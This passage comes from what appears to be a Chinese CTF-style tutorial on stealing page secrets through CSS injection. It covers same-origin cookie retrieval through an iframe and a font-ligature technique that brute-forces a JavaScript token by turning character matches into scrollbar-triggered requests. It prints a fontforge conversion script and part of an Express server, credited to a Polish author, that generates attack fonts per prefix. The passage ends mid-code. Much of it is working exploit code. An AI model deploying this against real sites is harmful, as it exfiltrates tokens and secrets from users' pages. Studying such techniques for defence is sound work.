                }
                function createIframeWithCss() {
                    iframe.src = 'http://127.0.0.1/css.php?css=' + encodeURIComponent(generateCSS());
                }
            })();
效果如下图所示：
### Token1 - Same Origin
这个过程需要理解的就是在字符注入爆破成功时设置的 cookie ，它需要我们用 iframe src 同源的域名才能拿到这个 cookie
，否则会受到同源策略的限制拿不到，我们可以做一个简单的测试：
这里`zedd.vv`映射到了 127.0.0.1 ，可以看到因为不同源，`zedd.vv`是拿不到 iframe 的 cookie 的，而通过
127.0.0.1 访问 test.html ，因为服务对于 cookie 的设置存在`Path=/`，所以我们能在父页面也能拿到 iframe 当中的
cookie
### Token2 - Font
现在我们来尝试去获取 javascript 代码中的 token2，在开始之前我们先了解一下什么叫做连字：
  * [连字简述](http://www.mzh.ren/ligature-intro.html)
  * [连字那些事](https://webzhao.me/ligatures.html)
简而言之，字体中的连字是至少两个具有图形表示形式的字符的序列。最常见的连字可能是"fi"序列。在下面的图片中，我们可以很清晰地看到"f"与"i"；而在第二行中，我们对这两个字母的顺序使用了不同的字体表示-字母"f"的顶部连接到"i"上方的点。这里我们应该将连字与字距区别开来：字距调整仅确定字体中字母之间的距离，而连字是给定字符序列的完全独立的字形（图形符号）。
我们可以借助 fontforge 来生成我们需要的连字，因为现代浏览器已经不支持 SVG 格式的字体了，我们可以利用 fontforge 将 SVG
格式转换成 WOFF 格式，我们可以准备一个名为 script.fontforge 的文件，内容如下：
    #!/usr/bin/fontforge
    Open($1)
    Generate($1:r + ".woff")
我们可以用`fontforge script.fontforge .svg`这个命令来生成 woff 文件，下面这段 svg 代码定义了一种名叫
hack 的字体，包括 a-z 26 个0宽度的字母，以及 sekurak 这个宽度为8000的连字。
将以上代码保存为 test.svg，然后使用`fontforge ./script.fontforge test.svg`命令生成 test.woff
，我们再将其引入就好了。
这里我们做个简单的验证，将以下代码保存为 test.html
        Document
        123sekurak123
然后用一个 font.html 用 iframe 将其引入:
        Document
访问 test.html 之后我们可以看到收到了请求。
这里的原理也比较简单，在基于 WebKit 或其分支之一的浏览器中，我们可以使用`-webkit-scrollbar`来设置滚动条样式，而出现滚动条样式，我们需要使用`nowrap`让其不换行。这里需要注意的是，如果要完全设置样式，先得添加伪类`-webkit-scrollbar`，这样才能利用连字的宽度来触发`-webkit-scrollbar:horizontal`属性来执行我们的请求。
### Token2 - Get From JavaScript
从上面这个 demo 我们大概就可以得到一个思路了，将所有字体也都设置为0，然后用连字的方法来爆破得到 token2
这里直接给出波兰那位作者的代码：
    const express = require('express');
    const app = express();
    // Serwer ExprssJS domyślnie dodaje nagłówek ETag,
    // ale nam nie jest to potrzebne, więc wyłączamy.
    app.disable('etag');
    const PORT = 3001;
    const js2xmlparser = require('js2xmlparser');
    const fs = require('fs');
    const tmp = require('tmp');
    const rimraf = require('rimraf');
    const child_process = require('child_process');
    // Generujemy fonta dla zadanego przedrostka
    // i znaków, dla których ma zostać utworzona ligatura.
    function createFont(prefix, charsToLigature) {
        let font = {
            "defs": {
                "font": {
                    "@": {
                        "id": "hack",
                        "horiz-adv-x": "0"
                    },
                    "font-face": {
                        "@": {
                            "font-family": "hack",
                            "units-per-em": "1000"
                        }
                    },
                    "glyph": []
                }
            }
        };
        // Domyślnie wszystkie możliwe znaki mają zerową szerokość...
        let glyphs = font.defs.font.glyph;
        for (let c = 0x20; c  {
            const glyph = {
                "@": {
                    "unicode": prefix + c,
                    "horiz-adv-x": "10000",
                    "d": "M1 0z",
                }
            }
            glyphs.push(glyph);
        });
        // Konwertujemy JSON-a na SVG.
        const xml = js2xmlparser.parse("svg", font);
        // A następnie wykorzystujemy fontforge
        // do zamiany SVG na WOFF.
        const tmpobj = tmp.dirSync();
        fs.writeFileSync(`${tmpobj.name}/font.svg`, xml);
        child_process.spawnSync("/usr/bin/fontforge", [
            `${__dirname}/script.fontforge`,
            `${tmpobj.name}/font.svg`
        ]);
        const woff = fs.readFileSync(`${tmpobj.name}/font.woff`);
        // Usuwamy katalog tymczasowy.
        rimraf.sync(tmpobj.name);
        // I zwracamy fonta w postaci WOFF.
        return woff;
    }
    // Endpoint do generowania fontów.
    app.get("/font/:prefix/:charsToLigature", (req, res) => {
        const { prefix, charsToLigature } = req.params;
        // Dbamy o to by font znalazł się w cache'u.
        res.set({
            'Cache-Control': 'public, max-age=600',
            'Content-Type': 'application/font-woff',